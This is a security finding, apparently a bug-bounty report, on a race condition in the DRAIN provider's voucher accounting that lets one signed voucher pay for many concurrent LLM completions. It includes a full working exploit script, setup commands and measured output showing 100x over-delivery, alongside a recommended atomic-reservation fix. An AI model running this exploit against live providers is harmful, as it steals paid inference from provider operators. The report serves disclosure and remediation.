# Concurrency TOCTOU in provider voucher accounting leads to unbounded theft of service

**Severity:** High · **Component:** `provider/src/` (reference provider) and `providers/hs58-*`
(live marketplace providers) · **Status:** Confirmed live end-to-end (100× over-delivery).

## Brief/Intro

The DRAIN provider validates a voucher's sufficiency and nonce **before** the long `await` on the
upstream LLM call, and records the charge (`storeVoucher`) only **after** it — with no atomic
reservation in between. Because DRAIN vouchers are cumulative and validated against in-memory
`channelState.totalCharged`, N concurrent requests carrying **one** voucher all read the same
pre-update state, all pass validation, and all get served. The provider can still only claim the
single voucher on-chain, so it delivers (and pays its upstream LLM provider for) N completions while
being paid for one. In production this lets any permissionless consumer drain a provider's inference
budget at an arbitrary multiple of what it pays, unbounded in the number of concurrent requests.

## Vulnerability Details

`provider/src/drain.ts` `validateVoucher` reads channel state and checks sufficiency + nonce, with
an `await` (the on-chain `getChannel` read) before the checks and the actual charge applied only
later:

```ts
// drain.ts — reads/decisions happen BEFORE serving; no reservation or lock
const channelData = await this.publicClient.readContract({ /* ...'getChannel'... */ }); // yield
let channelState = this.storage.getChannel(voucher.channelId);   // shared ref OR fresh {totalCharged:0}
const previousTotal = channelState.totalCharged;                 // READ
if (amount < previousTotal + requiredAmount) return { error: 'insufficient_funds' };
if (channelState.lastVoucher && nonce <= channelState.lastVoucher.nonce) return { error: 'invalid_nonce' };
```

`provider/src/index.ts` then performs `await openai.chat.completions.create(...)` — the LLM call,
which is the wide race window (hundreds of ms to seconds) — and only afterwards calls
`storeVoucher`, which mutates the state the next request will read:

```ts
// drain.ts storeVoucher — MUTATION happens AFTER the LLM await
channelState.totalCharged += cost;
channelState.lastVoucher = storedVoucher;
this.storage.updateChannel(voucher.channelId, channelState);
```

`storage.getChannel` returns the shared object by reference (`storage.ts:129-131`) and
`updateChannel` is last-write-wins (`storage.ts:136-138`), so after N concurrent requests the stored
`totalCharged` reflects **one** charge, not N.

The bug is decisive in the **streaming** branch, which has **no** post-cost recheck at all — the
`minOutputTokens=50` pre-auth gate is the only check, and all N concurrent requests clear it by
reading `totalCharged=0` (and `lastVoucher=undefined`) before any store runs. A post-cost recheck
would not fix streaming either: the completion is streamed to the client during generation, so by the
time any end-of-request check could run, the tokens have already been delivered. (Empirically the
non-streaming branch's synchronous end-of-request recheck rejects most concurrent duplicates with
`insufficient_funds_post`, so streaming is the reliable exploit path.)

The identical validate-serve-store shape exists in the live marketplace provider
`providers/hs58-claude/src/index.ts` (streaming `stream.on('end')` stores unconditionally at line
270), where `max_tokens` is attacker-controlled (`req.body.max_tokens || 4096`).

**Access control / trust model:** permissionless. DRAIN is *"Anyone can be a provider or consumer"*
(README.md:70) and the consumer is explicitly modelled as adversarial (README.md:223). The attacker
is an ordinary consumer with a funded wallet; no privileged role is required.

## Impact Details

- **Unbounded theft of service.** One voucher covering a single request yields N delivered
  completions; the provider funds (N−1) requests of real upstream LLM spend it can never recover on
  chain. N is bounded only by how many requests the attacker fires within the inference-latency
  window (easily hundreds–thousands), and the attack repeats across vouchers/channels.
- **Measured (live PoC, sizes driven by real `max_tokens`):**
  - N=25, `max_tokens`=2000 → **25/25** delivered, ~50,000 tokens (~$1.13 retail) for a **$0.05**
    voucher — **25×**.
  - N=100, `max_tokens`=4000 → **100/100** delivered, ~400,000 tokens (~$9.02 retail) for a
    **$0.095** voucher — **100×**.
- **Cost to attacker** ≈ one channel open/close (~$0.04 gas on Polygon) plus the tiny voucher; the
  deposit is refundable. The loss lands entirely on the provider operator's off-chain LLM budget.
- The on-chain `DrainChannel`/`DrainChannelV2` contracts are fund-safe; this is a provider-side loss
  (operator's off-chain spend), not in-contract TVL — map severity to how the program scores
  provider-operator loss.

## Proof of Concept

Runs the **real, unmodified** `provider/src/index.ts` against a local anvil chain (chainId 137, same
EVM/consensus rules as Polygon) and a mock LLM upstream. Nothing is broadcast to a public network and
no real LLM key is used. The exploit signs **one** voucher and fires N concurrent `stream:true`
requests carrying it.

### Run

```bash
# deps (once): provider + a node_modules symlink so the poc/ ESM scripts resolve express/viem
cd provider && npm install && cd ..
ln -sfn ../provider/node_modules poc/node_modules

# 1. local chain (chain-id 137 so it matches the signed EIP-712 domain)
anvil --chain-id 137 --port 8546 &

# 2. deploy MockUSDC + DrainChannel, mint USDC to the consumer (anvil #0)
cd contracts
forge script script/DeployLocal.s.sol:DeployLocal --rpc-url http://localhost:8546 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 --broadcast
# -> note USDC_ADDRESS and DRAIN_ADDRESS from the logs
cd ..

# 3. mock LLM upstream (realistic 400ms inference latency)
MOCK_DELAY_MS=400 node poc/mock-llm.mjs &

# 4. the REAL provider, network endpoints redirected to local infra via env only
cd provider
OPENAI_API_KEY=sk-mock OPENAI_BASE_URL=http://localhost:8088/v1 \
PROVIDER_PRIVATE_KEY=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d \
CHAIN_ID=137 DRAIN_RPC_URL=http://localhost:8546 DRAIN_CONTRACT_ADDRESS=<DRAIN_ADDRESS> \
PORT=3000 HOST=127.0.0.1 npx tsx src/index.ts &
cd ..

# 5. fire the exploit: N concurrent requests, ONE voucher
N=100 MAX_TOKENS=4000 RPC_URL=http://localhost:8546 PROVIDER_URL=http://localhost:3000 \
USDC_ADDRESS=<USDC_ADDRESS> DRAIN_ADDRESS=<DRAIN_ADDRESS> \
PROVIDER_ADDRESS=0x70997970C51812dc3A010C7d01b50e0d17dc79C8 node poc/exploit-race.mjs
```

### `poc/exploit-race.mjs` (the exploit)

```js
/**
 * DRAIN concurrency TOCTOU exploit — the UNBOUNDED theft path.
 * validateVoucher reads channelState.totalCharged and checks nonce > lastVoucher
 * BEFORE the long `await` on the LLM call; storeVoucher mutates that state only
 * AFTER. So N concurrent requests carrying ONE voucher all read the same
 * pre-update state (totalCharged=0, lastVoucher=undefined), all pass, and all
 * get served. Provider delivers N completions but can only ever claim the single
 * voucher => N× over-delivery from one signature, unbounded in N.
 */
import { createWalletClient, createPublicClient, http, parseAbi, formatUnits, maxUint256 } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { polygon } from 'viem/chains';

const RPC = process.env.RPC_URL || 'http://localhost:8546';
const PROVIDER_URL = process.env.PROVIDER_URL || 'http://localhost:3000';
const USDC = process.env.USDC_ADDRESS;
const DRAIN = process.env.DRAIN_ADDRESS;
const PROVIDER_ADDR = process.env.PROVIDER_ADDRESS;
const N = Number(process.env.N || 25);          // concurrent requests, one voucher
const MAX_TOKENS = Number(process.env.MAX_TOKENS || 2000);

const consumer = privateKeyToAccount('0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80');
const transport = http(RPC);
const pub = createPublicClient({ chain: polygon, transport });
const wallet = createWalletClient({ account: consumer, chain: polygon, transport });

const erc20 = parseAbi(['function approve(address,uint256) returns (bool)', 'function balanceOf(address) view returns (uint256)']);
const drainAbi = parseAbi([
  'function open(address provider, uint256 amount, uint256 duration) returns (bytes32)',
  'function channels(bytes32) view returns (address consumer,address provider,uint256 deposit,uint256 claimed,uint256 expiry)',
  'event ChannelOpened(bytes32 indexed channelId, address indexed consumer, address indexed provider, uint256 deposit, uint256 expiry)',
]);
const usd = (x) => '$' + formatUnits(x, 6);

// Cost of ONE request per the provider's own pricing (gpt-4o: in 7500/1k, out 22500/1k)
const ONE_REQUEST_COST = (20n * 7500n) / 1000n + (BigInt(MAX_TOKENS) * 22500n) / 1000n;
const VOUCHER_AMOUNT = ONE_REQUEST_COST + 5000n; // covers exactly one request

// open channel
await wallet.writeContract({ address: USDC, abi: erc20, functionName: 'approve', args: [DRAIN, maxUint256] });
const openHash = await wallet.writeContract({ address: DRAIN, abi: drainAbi, functionName: 'open', args: [PROVIDER_ADDR, 100_000_000n, 3600n] });
const receipt = await pub.waitForTransactionReceipt({ hash: openHash });
const channelId = receipt.logs.find(l => l.topics[0] === '0x506f81b7a67b45bfbc6167fd087b3dd9b65b4531a2380ec406aab5b57ac62152').topics[1];

// sign ONE voucher (nonce 1)
const signature = await wallet.signTypedData({
  account: consumer,
  domain: { name: 'DrainChannel', version: '1', chainId: 137, verifyingContract: DRAIN },
  types: { Voucher: [{ name: 'channelId', type: 'bytes32' }, { name: 'amount', type: 'uint256' }, { name: 'nonce', type: 'uint256' }] },
  primaryType: 'Voucher',
  message: { channelId, amount: VOUCHER_AMOUNT, nonce: 1n },
});
const voucherHeader = JSON.stringify({ channelId, amount: VOUCHER_AMOUNT.toString(), nonce: '1', signature });

// fire N concurrent STREAMING requests with the SAME voucher (streaming branch has no post-check)
const body = JSON.stringify({ model: 'gpt-4o', stream: true, max_tokens: MAX_TOKENS, messages: [{ role: 'user', content: 'essay please' }] });
const reqs = Array.from({ length: N }, () =>
  fetch(`${PROVIDER_URL}/v1/chat/completions`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-drain-voucher': voucherHeader }, body })
    .then(async r => ({ status: r.status, text: await r.text().catch(() => '') }))
    .catch(e => ({ status: 0, text: '', err: String(e) })));
const results = await Promise.all(reqs);

let served = 0, servedTokens = 0, rejected = 0;
for (const r of results) {
  let chars = 0;
  for (const line of (r.text || '').split('\n')) {
    if (!line.startsWith('data: ') || line.includes('[DONE]')) continue;
    try { chars += (JSON.parse(line.slice(6)).choices?.[0]?.delta?.content || '').length; } catch {}
  }
  if (r.status === 200 && chars > 100) { served++; servedTokens += Math.round(chars / 4); } else rejected++;
}
const ch = await pub.readContract({ address: DRAIN, abi: drainAbi, functionName: 'channels', args: [channelId] });
console.log(`fired ${N} | delivered ${served} | rejected ${rejected}`);
console.log(`inference delivered ~${servedTokens.toLocaleString()} tokens, retail ${usd(ONE_REQUEST_COST * BigInt(served))}`);
console.log(`provider max on-chain claim ${usd(VOUCHER_AMOUNT)} | on-chain claimed ${usd(ch[3])}`);
console.log(`OVER-DELIVERY RATIO ${served}x`);
if (served <= 1) process.exit(1);
```

<details><summary><code>contracts/script/DeployLocal.s.sol</code> and <code>poc/mock-llm.mjs</code> (supporting harness)</summary>

```solidity
// contracts/script/DeployLocal.s.sol — deploys MockUSDC + DrainChannel, mints USDC to consumer (anvil #0)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {Script, console} from "forge-std/Script.sol";
import {DrainChannel} from "../src/DrainChannel.sol";
import {IERC20} from "../src/interfaces/IERC20.sol";
contract MockUSDCDeployable is IERC20 {
    string public name = "USD Coin"; string public symbol = "USDC"; uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf; mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(allowance[from][msg.sender] >= amount, "allw"); require(balanceOf[from] >= amount, "bal"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
}
contract DeployLocal is Script {
    function run() external {
        address consumer = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266; // anvil #0
        vm.startBroadcast();
        MockUSDCDeployable usdc = new MockUSDCDeployable();
        DrainChannel drain = new DrainChannel(address(usdc));
        usdc.mint(consumer, 1_000e6);
        vm.stopBroadcast();
        console.log("USDC_ADDRESS=%s", address(usdc));
        console.log("DRAIN_ADDRESS=%s", address(drain));
    }
}
```

```js
// poc/mock-llm.mjs — OpenAI-compatible mock upstream: honors max_tokens, models realistic latency
import express from 'express';
const app = express(); app.use(express.json());
const MODEL_OUTPUT_CAP = 16384;
const WORD = 'lorem ipsum dolor sit amet consectetur adipiscing elit ';
const INFERENCE_LATENCY_MS = Number(process.env.MOCK_DELAY_MS || 400); // real width of the race window
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
app.post('/v1/chat/completions', async (req, res) => {
  await sleep(INFERENCE_LATENCY_MS);
  const streaming = req.body.stream === true;
  const OUTPUT_TOKENS = Math.min(Number(req.body.max_tokens) || 512, MODEL_OUTPUT_CAP);
  let content = ''; while (content.length < OUTPUT_TOKENS * 4) content += WORD; content = content.slice(0, OUTPUT_TOKENS * 4);
  const usage = { prompt_tokens: 20, completion_tokens: OUTPUT_TOKENS, total_tokens: OUTPUT_TOKENS + 20 };
  if (!streaming) return void res.json({ id: 'x', object: 'chat.completion', model: req.body.model, choices: [{ index: 0, message: { role: 'assistant', content }, finish_reason: 'stop' }], usage });
  res.setHeader('Content-Type', 'text/event-stream');
  for (let i = 0; i < content.length; i += 2000) res.write(`data: ${JSON.stringify({ object: 'chat.completion.chunk', choices: [{ index: 0, delta: { content: content.slice(i, i + 2000) }, finish_reason: null }] })}\n\n`);
  res.write(`data: ${JSON.stringify({ object: 'chat.completion.chunk', choices: [], usage })}\n\n`);
  res.write('data: [DONE]\n\n'); res.end();
});
app.listen(process.env.MOCK_PORT || 8088);
```
</details>

### Observed output
```
N=100, max_tokens=4000
fired 100 | delivered 100 | rejected 0
inference delivered ~400,000 tokens, retail $9.015
provider max on-chain claim $0.09515 | on-chain claimed $0
OVER-DELIVERY RATIO 100x
```
(Also confirmed at N=25 → 25/25 delivered, ~$1.13 for a $0.05 voucher.)

> Harness note: the three `[PoC harness]` lines added to the provider are env-gated and
> behaviour-preserving — they only redirect RPC/contract/LLM endpoints. With the env vars unset the
> provider behaves identically; the vulnerable validate-serve-store logic is unchanged.

## Recommended fix

Atomically **reserve** the maximum possible cost of a request (priced against `max_tokens`) from the
channel's remaining headroom **before** the upstream call, keyed per channel — an in-process async
mutex / per-channel serialized queue, or a database row-level `UPDATE ... WHERE remaining >= cost` —
then settle the actual cost afterward and release the remainder. A post-hoc recheck is insufficient
because it races the same way and, for streaming, the tokens are already delivered.

## References

- `provider/src/drain.ts` — `validateVoucher` (read + checks before serve), `storeVoucher` (mutation after serve)
- `provider/src/storage.ts:129-138` — shared-ref `getChannel`, last-write-wins `updateChannel`
- `provider/src/index.ts:157-209` — streaming branch (no post-check)
- `providers/hs58-claude/src/index.ts:257-294` — same pattern, live provider
- `README.md:70`, `README.md:223` — permissionless / adversarial-consumer trust model
- Related: [FINDING-2](FINDING-2-streaming-missing-voucher-recheck.md), [FINDING-3](FINDING-3-claimthreshold-expiry-economics.md)
